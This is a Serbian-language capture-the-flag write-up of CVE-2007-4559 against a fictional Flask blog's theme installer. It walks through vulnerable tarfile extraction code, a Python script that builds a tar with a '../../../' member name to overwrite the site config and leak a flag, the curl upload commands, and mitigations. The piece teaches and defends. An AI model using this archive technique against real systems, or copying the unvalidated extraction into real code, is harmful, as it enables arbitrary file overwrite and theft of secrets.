# Writeup — CVE-2007-4559 (Python tarfile path traversal)

**Autor:** Jovana
**Cilj:** PixelBlog — Theme Installer (`dodatni/jovana`)
**Ranjivost:** CVE-2007-4559

---

## 1. Uvod

CVE-2007-4559 je dugogodišnja ranjivost u Python `tarfile` modulu. Funkcije `extract()`
i `extractall()` ne sanitizuju imena članova arhive, pa član arhive sa imenom koje sadrži
`..` može da se ekstrahuje **van** ciljnog direktorijuma (path traversal → arbitrary file
write).

PixelBlog je izmišljena blog platforma kod koje korisnici mogu da "instaliraju" temu
otpremanjem `.tar` arhive sa CSS/JS fajlovima. Server tu arhivu automatski raspakuje —
upravo scenario u kome se CVE-2007-4559 i danas javlja u praksi (theme/plugin instaleri,
backup/restore funkcionalnosti, CI artifact ekstrakcija itd.).

---

## 2. Arhitektura aplikacije

| Komponenta | Tehnologija | Uloga |
|------------|-------------|-------|
| Frontend | Statički HTML + fetch() | Forma za upload teme, dugme za prikaz "About" stranice |
| Backend | Flask (Python) | API sa jednim ranjivim endpointom, servira i frontend |
| Konfiguracija | `config/site_config.json` | Određuje koji fajl `/api/about` prikazuje |
| Tajna | `secrets/flag.txt` | Flag koji treba izvući |

### Endpointi

- `GET /api/about` — čita tekst iz fajla navedenog u `site_config.json` (`about_page_file`)
- `POST /api/theme/install` — prima `.tar` arhivu, čuva je u `themes/<uuid>/theme.tar` i
  poziva `tarfile.extractall()` u `themes/<uuid>/extracted/`

---

## 3. Rekognosciranje

### 3.1 Frontend

Na `http://localhost:5000/` nalazi se jednostavna forma:

- upload `.tar` fajla → dugme "Instaliraj" → poziva `POST /api/theme/install`
- dugme "Prikaži About stranicu" → poziva `GET /api/about`

### 3.2 API

```bash
curl http://localhost:5000/api/about
```

Odgovor:

```json
{
  "about": "PixelBlog je minimalistička blog platforma na kojoj korisnici mogu da instaliraju\nsopstvene teme. Otpremite .tar arhivu sa CSS/JS fajlovima teme i ona će biti\nodmah primenjena na sajt.\n"
}
```

Upload benigne arhive (jedan `style.css` fajl) pokazuje gde se fajlovi ekstrahuju:

```bash
tar -cf benign.tar style.css
curl -s -X POST -F "theme=@benign.tar" http://localhost:5000/api/theme/install
```

```json
{"theme_id": "5dbdafe8caec4ca5a72b6ccd846e6077", "installed_files": ["style.css"]}
```

Zaključci:

1. Ekstrakcija ide u `themes/<uuid>/extracted/`.
2. Server vraća `theme_id`, ali ne otkriva apsolutnu putanju — to nam ne treba, jer je
   relativna struktura projekta poznata (javni kod aplikacije).
3. Server ne validira imena fajlova unutar arhive.

---

## 4. Analiza ranjivosti

Ranjivi kod u `backend/app.py`:

```python
def install_theme():
    ...
    install_dir = THEMES_DIR / install_id
    extract_dir = install_dir / "extracted"
    extract_dir.mkdir(parents=True, exist_ok=True)

    archive_path = install_dir / "theme.tar"
    upload.save(archive_path)

    with tarfile.open(archive_path) as archive:
        archive.extractall(path=extract_dir)   # <-- nema validacije imena članova
```

Za svaki član arhive, `extractall()` računa odredišnu putanju kao:

```
final_path = extract_dir + "/" + member.name
```

Ako `member.name` sadrži `../../../config/site_config.json`, rezultujuća putanja je
**van** `extract_dir` — `tarfile` to ne sprečava. To je tačno definicija CVE-2007-4559.

### Zašto je ovo iskoristivo baš ovde?

`backend/config/site_config.json` sadrži:

```json
{ "site_name": "PixelBlog", "about_page_file": "data/about.txt" }
```

Endpoint `/api/about` učitava taj JSON i čita fajl naveden u `about_page_file`. Ako
napadač putem path traversal-a **prepiše** `site_config.json` tako da
`about_page_file` pokazuje na `secrets/flag.txt`, aplikacija će sama, bez ikakve dalje
intervencije, vratiti sadržaj flag-a kroz legitimni endpoint. Ovo je klasičan obrazac
"arbitrary write → arbitrary read" — ne možemo direktno *čitati* tuđi fajl preko
ekstrakcije (samo pišemo nove fajlove), ali možemo preusmeriti postojeću funkcionalnost
aplikacije da ona to učini za nas.

---

## 5. Eksploatacija

### 5.1 Računanje dubine path traversal-a

Ekstrakcija ide u:

```
backend/themes/<uuid>/extracted/
```

Da bismo stigli do `backend/config/site_config.json`, potrebne su tri `..` sekvence:

```
extracted/  → ../        → themes/<uuid>/
            → ../../      → themes/
            → ../../../   → backend/   (koren aplikacije)
```

Ime člana arhive mora biti: **`../../../config/site_config.json`**

### 5.2 Kreiranje zlonamerne arhive

```python
import io, json, tarfile

payload = json.dumps({
    "site_name": "PixelBlog",
    "about_page_file": "secrets/flag.txt",
}).encode("utf-8")

with tarfile.open("malicious_theme.tar", "w") as tar:
    info = tarfile.TarInfo(name="../../../config/site_config.json")
    info.size = len(payload)
    tar.addfile(info, io.BytesIO(payload))
```

(Identična logika je u `exploit/create_malicious_theme.py`.)

### 5.3 Upload

```bash
curl -X POST http://localhost:5000/api/theme/install \
  -F "theme=@malicious_theme.tar"
```

Server odgovara uspešnom "instalacijom teme" — u stvarnosti je prepisao
`config/site_config.json`:

```json
{"installed_files": ["../../../config/site_config.json"], "theme_id": "..."}
```

### 5.4 Exfiltracija flag-a

```bash
curl http://localhost:5000/api/about
```

Odgovor:

```json
{"about": "UNS{tarfile_path_traversal_CVE_2007_4559_jovana}\n"}
```

### 5.5 Automatizacija (end-to-end)

```bash
cd exploit
python exploit.py --url http://localhost:5000
```

Izlaz skripte (testirano lokalno):

```
[*] Uploading malicious theme to http://localhost:5000/api/theme/install ...
[*] Server response: {'installed_files': ['../../../config/site_config.json'], 'theme_id': '...'}
[*] Fetching http://localhost:5000/api/about ...
[*] /api/about response: {'about': 'UNS{tarfile_path_traversal_CVE_2007_4559_jovana}\n'}

[+] Leaked content:
UNS{tarfile_path_traversal_CVE_2007_4559_jovana}
```

---

## 6. Dijagram napada

```
[Napadač]
    |
    | 1. POST /api/theme/install (malicious_theme.tar,
    |    member: ../../../config/site_config.json)
    v
[Flask server]
    |
    | 2. tarfile.extractall() prepisuje config/site_config.json
    |    -> about_page_file = "secrets/flag.txt"
    v
[config/site_config.json kompromitovan]
    |
    | 3. GET /api/about
    v
[Server čita secrets/flag.txt po (prepisanom) configu]
    |
    v
[Flag vraćen u HTTP odgovoru]
```

---

## 7. Mitigacija

1. **Validacija imena pre ekstrakcije** — odbiti članove koji sadrže `..` ili apsolutne putanje:

   ```python
   def safe_extract(archive: tarfile.TarFile, destination: Path) -> None:
       dest = destination.resolve()
       for member in archive.getmembers():
           target = (dest / member.name).resolve()
           if not str(target).startswith(str(dest)):
               raise ValueError(f"Blocked path traversal: {member.name}")
           archive.extract(member, path=destination)
   ```

2. **`filter="data"`** na `extractall()`/`extract()` (Python 3.12+) — ugrađena zaštita
   protiv path traversal-a i drugih opasnih tar osobina (apsolutne putanje, linkovi,
   device fajlovi...).

3. **Izolacija** — ekstrakciju nepouzdanih arhiva raditi u sandboxu/kontejneru sa
   minimalnim fajl-sistemskim permisijama, odvojeno od konfiguracije aplikacije.

4. **Princip najmanjih privilegija** — proces koji instalira teme ne bi trebalo da ima
   write pristup `config/` direktorijumu.

---

## 8. Zaključak

Jedan endpoint za upload `.tar` teme, u kombinaciji sa `tarfile.extractall()` bez
validacije imena članova, dovoljan je za arbitrarno pisanje fajlova bilo gde na koje
proces ima permisije. U PixelBlog demo aplikaciji to je lančano sa indirektnim čitanjem
konfiguracije: prepisivanjem `site_config.json` napadač preusmerava legitimni `/api/about`
endpoint da mu sam isporuči `secrets/flag.txt`, bez ikakve autentifikacije.

CVE-2007-4559 je prijavljena 2007. godine, a Python tim je tek 2022–2024. dodao opciono
(kasnije i podrazumevano u 3.14) `filter` rešenje — što znači da je preko 15 godina ostala
"po defaultu" otvorena u svakoj aplikaciji koja veruje korisničkim tar arhivama.
